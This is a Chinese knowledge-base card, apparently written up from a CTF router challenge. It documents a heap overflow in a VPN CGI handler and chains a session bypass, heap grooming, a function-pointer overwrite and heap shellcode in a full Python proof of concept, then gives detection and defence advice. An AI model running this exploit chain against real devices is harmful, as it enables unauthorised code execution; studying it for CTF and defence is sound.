---
id: binary-pwn-heap-cgi-vpn-strcpy-custom-ptr-callback-hijack
title: CGI VPN 配置堆溢出：strcpy 跨字段覆盖 custom_ptr 后任意写劫持 apply_cb
type: scenario
domain: binary
path: binary/pwn/heap
technique: cgi-vpn-strcpy-custom-ptr-callback-hijack
tags:
- pwn
- heap
- cgi
- router
- strcpy
- heap-overflow
- function-pointer
- shellcode
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V91
  verified_at: '2026-11-05T19:39:07+08:00'
  notes: 已对照原文与5图核对：Set_VPN malloc(0xf0)、custom_ptr=+0xe8、apply_cb=+0x10、pass=0x20 跨字段覆盖、Edit_VPN_Custom memcpy 写、Apply_VPN call [vpn_list+0x10]；gdb 图确认 RDX=...5c21(dispatch_action+116)、RDI=...94f0、堆上 jmp 0x...95f0 及 execve 写 flag，最终 GET /flag.html 得到 SUCTF{test_flag}。原文为 CTF 题复现且链已打通；无组件版本标记，未设 affected_versions。frontmatter无sources/source_url。
url: /docs/binary/pwn/heap/binary-pwn-heap-cgi-vpn-strcpy-custom-ptr-callback-hijack/
draft: false
kb_aliases:
- EzRouter pwn
- VPN 配置堆溢出
- custom_ptr 劫持
- apply_cb 函数指针
- 路由器 CGI 堆利用
- strcpy 跨字段
---

## 一句话结论

路由器 CGI 的 VPN 配置结构体在堆上分配后，用 `strcpy` 逐个拷贝字段且不强制 NUL 结尾；当 `pass` 恰好填满 0x20 字节时，`strcpy` 会继续跨字段写入并覆盖偏移 +0xe8 的 `custom_ptr`，随后 `Edit_VPN_Custom` 的 `memcpy(custom_ptr, ...)` 变成受控写，可用 2 字节部分覆盖把偏移 +0x10 的 `apply_cb` 改成 `jmp rdi` gadget，`Apply_VPN` 调用回调时跳入堆上的 shellcode。

## 原理

- `Set_VPN` 先 `malloc(0xf0)` 创建 `vpn_config_req`，把全局 `vpn_list[0]` 指向该堆对象；结构体内关键字段：`apply_cb` 在 +0x10，`custom_ptr` 在 +0xe8。
- 随后用连续的 `strcpy` 把 `action/name/proto/server/user/pass` 等输入拷入结构体。`vpn.cgi` 的解析允许“字段刚好填满长度时不补 `\0`”，因此 `pass` 长度为 0x20 时没有终止符，`strcpy` 会继续读到后续字段（`cert`/`custom` 的内容），把字节一路写进 `custom_ptr`，实现跨字段覆盖。
- `Edit_VPN_Custom`：若 `vpn_list` 与 `custom_ptr` 非空，取请求中的长度 `n`，与 `*(uint16_t *)vpn_list` 取较小值，然后 `memcpy(custom_ptr, payload, n)`。这让攻击者获得一个“目标地址由 `custom_ptr` 决定、长度受限”的任意写。
- `Apply_VPN`：若 `vpn_list` 与 `apply_cb` 非空，执行 `(*(void (**)(void *))(vpn_list + 0x10))(vpn_list)`。把 `custom_ptr` 指到 `vpn_list + 0x10`（即 `apply_cb` 字段），再用 `edit` 写 2 字节，就能只改回调的低 16 位，保留原有高字节，把它重定向到二进制中的 `jmp rdi` gadget；此时 `rdi = vpn_list`，而堆对象起始处布置了跳向 `custom` 缓冲区 shellcode 的短跳。
- 2 字节部分覆盖依赖 PIE 基址的低 16 位；ASLR 开启时需要爆破一个字节（16 种可能），关闭 ASLR 可直接命中。shellcode 通过 `execve("/bin/sh", ["/bin/sh","-c","cat flag > ./www/flag.html"], 0)` 把 flag 写到 Web 目录，再 GET 读取。
- 堆风水：先用 `list.cgi` 的 `add_black` 连续分配/释放若干 0xf0 大小的块，稳定 tcache/fastbin 与堆布局，使 `vpn_config_req` 与 `custom` 缓冲区落在可预测的相邻位置。

## 触发条件

- 能访问路由器 CGI 管理端（可配合 `action=login&auth=1` 的会话绕过获得 Cookie）；
- 存在 `vpn.cgi` 的 `set/edit/apply` 动作，且配置结构体在堆上、字段用 `strcpy` 拷贝；
- 字段长度可精确控制（如 `pass` 恰好 0x20 字节）；
- 有可控的 `custom`/`cert` 字段用于放置 shellcode 与覆盖 `custom_ptr`；
- 二进制中能找到 `jmp rdi` 类 gadget；PIE/ASLR 开启时需要可爆破的部分覆盖。

## 利用步骤

1. 通过认证绕过拿到 `session_id` Cookie（见关联卡）。
2. 堆风水：连续 7 次调用 `list.cgi` 的 `add_black`（`action=add_black&idx=i&mac=123&note=123`），分配/释放 0xf0 级堆块，稳定后续 VPN 结构体的落点。
3. 调用 `vpn.cgi` 的 `set`：`pass` 填 0x20 字节无 NUL，`custom` 放入 shellcode（Base64，填充到固定长度），`cert` 放入用于覆盖 `custom_ptr` 的字节；`strcpy` 跨字段把 `custom_ptr` 改成指向 `apply_cb`（或经 cert 字节计算出的地址）。
4. 调用 `vpn.cgi` 的 `edit`，`custom` 为 2 字节（如 `21 5c`），`Edit_VPN_Custom` 把 `apply_cb` 的低 2 字节改成 `jmp rdi` gadget 地址。
5. 调用 `vpn.cgi` 的 `apply`：`Apply_VPN` 调用被劫持的 `apply_cb(vpn_list)`，`rdi = vpn_list`，gadget 跳入堆上 shellcode。
6. shellcode 执行 `cat flag > ./www/flag.html`；请求 `/flag.html` 读取 flag。
7. ASLR 开启时对低字节进行爆破，重复步骤 2-6 直到命中。

## PoC

关键请求骨架（完整偏移/字节按目标二进制调整）：

```python
import requests, base64
from pwn import asm, shellcraft, context
context.arch = "amd64"
BASE = "http://127.0.0.1:8080"

# 1) 会话绕过
r = requests.get(BASE + "/www/http?action=login&auth=1", allow_redirects=False)
sid = r.headers["Set-Cookie"].split("session_id=")[1].split(";")[0]
cookies = {"session_id": sid}

# 2) 堆风水：7 次 blacklist 分配
for i in range(7):
    requests.post(BASE + "/cgi-bin/list.cgi",
                  data={"action": "add_black", "idx": str(i), "mac": "123", "note": "123"},
                  cookies=cookies)

# 3) set：pass 恰好 0x20，跨字段覆盖 custom_ptr；custom 放 shellcode
shellcode = asm(shellcraft.execve("/bin/sh", ["/bin/sh", "-c", "cat flag > ./www/flag.html"], 0))
custom_raw = shellcode.ljust(0x7EB, b"\x90") + b"\x00"
cert_raw = b"\x00\xe9\xf2\x00\x00\x00"
requests.post(BASE + "/cgi-bin/vpn.cgi", json={
    "action": "set", "name": "1", "proto": "openvpn", "server": "2",
    "user": "3", "pass": "4" * 0x20,
    "cert": "".join("\\x%02x" % b for b in cert_raw),
    "custom": "B64:" + base64.b64encode(custom_raw).decode(),
}, cookies=cookies)

# 4) edit：2 字节覆盖 apply_cb 低位，指向 jmp rdi gadget
requests.post(BASE + "/cgi-bin/vpn.cgi", json={
    "action": "edit",
    "custom": "B64:" + base64.b64encode(b"\x21\x5c").decode(),
}, cookies=cookies)

# 5) apply：触发回调 -> shellcode
requests.post(BASE + "/cgi-bin/vpn.cgi", json={"action": "apply"}, cookies=cookies)

# 6) 读取 flag
print(requests.get(BASE + "/flag.html").text)
```

## 变体与关联

- 变体：`custom_ptr` 也可指向 GOT/其他函数指针，用 `memcpy` 任意写改 `free@got`/`puts@got`；但本题的结构布局最适合 2 字节部分覆盖 `apply_cb`。
- 变体：若 `custom_ptr` 不能覆盖，可尝试其他字段的跨字段 `strcpy`、或 `Edit_VPN_Custom` 的长度上限（`uint16`）造成堆溢出。
- 变体：ASLR 开启时可用爆破、信息泄露（如 CGI 返回地址/堆地址）或相对覆盖降低不确定性。
- 关联：CGI 认证绕过、堆风水、函数指针劫持、`jmp rdi` gadget、shellcode 写 Web 目录。
- 边界：真实路由器固件比题目复杂（转发/NAT/无线/持久化），本卡只覆盖该 CGI 管理端的堆利用链。

## 检测与防御

- 防御：字段拷贝使用 `strncpy(dst, src, sizeof(field)-1)` 并显式补 NUL；在拷贝前校验每个字段长度，禁止跨字段读取。
- 防御：不要把函数指针与用户可控数据放在同一堆结构体；`Edit_VPN_Custom` 对 `custom_ptr` 做白名单/边界校验，限制目标地址范围与长度。
- 防御：启用 PIE + ASLR + NX，增加部分覆盖与 shellcode 执行难度；对 CGI 输入做严格 schema 校验。
- 检测：审计 `strcpy`/`memcpy` 与结构体字段布局；对 VPN 配置请求中异常的长度组合（如 `pass` 恰好 0x20）、`B64:` 大载荷、短 2 字节 edit 做告警。
- 检测：监控管理端异常会话、批量 blacklist 操作后紧跟 VPN set/edit/apply 的请求序列。
